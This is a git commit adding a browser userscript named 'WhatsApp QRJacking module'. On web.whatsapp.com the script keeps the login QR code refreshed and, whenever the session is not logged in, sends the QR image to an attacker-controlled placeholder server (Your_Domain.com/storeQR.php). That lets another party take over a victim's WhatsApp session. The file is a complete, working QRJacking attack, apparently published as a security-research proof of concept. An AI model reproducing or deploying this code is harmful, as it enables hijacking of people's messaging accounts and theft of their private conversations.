9e4fe7b50618eb9f752d0e8baf2b9a7c154f27b0
Mohamed A. Baset <mohamed.elnouby@mxmbMR13X0DTY3.local>
2016-07-13 11:51:32 -0500

    Pushing first bits!

---
+++ WhatsAppQRJackingModule.js
@@ -0,0 +1,27 @@
+// ==UserScript==
+// @name        WhatsApp QRJacking module
+// @namespace   Seekuritylabs (@Seekurity)
+// ==/UserScript==
+var myTimer;
+myTimer = window.setInterval(loopForQR, 3000);
+function loopForQR() {
+  if (document.readyState == 'complete') {
+    $service = window.location.href;
+    if ($service.indexOf('web.whatsapp.com') >= 0)
+    {
+      //Always wake-up the qrcode, Never sleep :D
+      if (document.getElementsByClassName('qr-button')[0] !== undefined)
+      {
+        document.getElementsByClassName('qr-button')[0].click();
+      }
+      //If WhatsApp is not logged in, Do;
+      if (document.getElementsByClassName('icon icon-chat')[0] == null)
+      {
+        //Mirror the QR Code to our server
+        var xhttp = new XMLHttpRequest();
+        xhttp.open('GET', 'https://www.Your_Domain.com/storeQR.php?c=' + document.getElementsByTagName('img')[0].src, true);
+        xhttp.send();
+      }
+    }
+  }
+}
